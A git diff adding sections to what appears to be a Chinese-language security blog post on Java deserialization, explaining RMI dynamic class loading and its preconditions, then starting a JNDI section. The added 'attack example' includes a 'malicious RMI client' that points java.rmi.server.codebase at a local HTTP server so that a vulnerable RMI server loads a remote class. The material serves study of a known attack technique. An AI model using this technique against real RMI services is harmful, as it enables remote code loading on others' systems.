@@ -226,6 +226,113 @@ sun.rmi.server.UnicastRef#marshalValue
 ![4.png](https://raw.githubusercontent.com/Ns1ookup/ns1ookup.github.io/master/_posts/java_ser/4.png)
 
 
+### RMI动态类加载
+
+RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class。
+
+对于客户端而言，如果服务端方法的返回值可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，客户端就需要从服务端提供的java.rmi.server.codebaseURL去加载类；
+
+对于服务端而言，如果客户端传递的方法参数是远程对象接口方法参数类型的子类，那么服务端需要从客户端提供的java.rmi.server.codebaseURL去加载对应的类。
+
+客户端与服务端两边的java.rmi.server.codebaseURL都是互相传递的。无论是客户端还是服务端要远程加载类，都需要满足以下条件：
+
+1. 由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。
+1. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从JDK 6u45、7u21开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
+
+
+**攻击示例**
+
+RMI Server
+
+	//RMIServer.java
+	package com.longofo.javarmi;
+	
+	import java.rmi.AlreadyBoundException;
+	import java.rmi.RMISecurityManager;
+	import java.rmi.RemoteException;
+	import java.rmi.registry.LocateRegistry;
+	import java.rmi.registry.Registry;
+	import java.rmi.server.UnicastRemoteObject;
+	
+	public class RMIServer2 {
+	    /**
+	     * Java RMI 服务端
+	     *
+	     * @param args
+	     */
+	    public static void main(String[] args) {
+	        try {
+	            // 实例化服务端远程对象
+	            ServicesImpl obj = new ServicesImpl();
+	            // 没有继承UnicastRemoteObject时需要使用静态方法exportObject处理
+	            Services services = (Services) UnicastRemoteObject.exportObject(obj, 0);
+	            Registry reg;
+	            try {
+	                //如果需要使用RMI的动态加载功能，需要开启RMISecurityManager，并配置policy以允许从远程加载类库
+	                System.setProperty("java.security.policy", RMIServer.class.getClassLoader().getResource("java.policy").getFile());
+	                RMISecurityManager securityManager = new RMISecurityManager();
+	                System.setSecurityManager(securityManager);
+	
+	                // 创建Registry
+	                reg = LocateRegistry.createRegistry(9999);
+	                System.out.println("java RMI registry created. port on 9999...");
+	            } catch (Exception e) {
+	                System.out.println("Using existing registry");
+	                reg = LocateRegistry.getRegistry();
+	            }
+	            //绑定远程对象到Registry
+	            reg.bind("Services", services);
+	        } catch (RemoteException e) {
+	            e.printStackTrace();
+	        } catch (AlreadyBoundException e) {
+	            e.printStackTrace();
+	        }
+	    }
+	}
+
+
+接口对象
+
+	package com.longofo.javarmi;
+	
+	import java.rmi.RemoteException;
+	
+	public interface Services extends java.rmi.Remote {
+	    Object sendMessage(Message msg) throws RemoteException;
+	}
+
+
+
+恶意RMI客户端
+
+
+	package com.longofo.javarmi;
+	
+	import com.longofo.remoteclass.ExportObject1;
+	
+	import java.rmi.registry.LocateRegistry;
+	import java.rmi.registry.Registry;
+	
+	public class RMIClient2 {
+	    public static void main(String[] args) throws Exception {
+	        System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8000/");
+	        Registry registry = LocateRegistry.getRegistry();
+	        // 获取远程对象的引用
+	        Services services = (Services) registry.lookup("rmi://127.0.0.1:9999/Services");
+	        ExportObject1 exportObject1 = new ExportObject1();
+	        exportObject1.setMessage("hahaha");
+	
+	        services.sendMessage(exportObject1);
+	    }
+	}
+
+
+这样就模拟出了另一种攻击场景，这时受害者是作为RMI服务端，需要满足以下条件才能利用：
+
+- RMI服务端允许远程加载类
+- 还有JDK限制(JDK 6u45、7u21)
+
+
 
 ### Java RMI扩展思考
 
@@ -258,4 +365,8 @@ JEP290只是为RMI注册表和RMI分布式垃圾收集器提供了相应的内�
 
 通过获取到绑定了Hello这个接口对象，接着构造执行链修改字节码。
 
+
+### Java JNDI反序列化
+
+JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），公共对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。
 
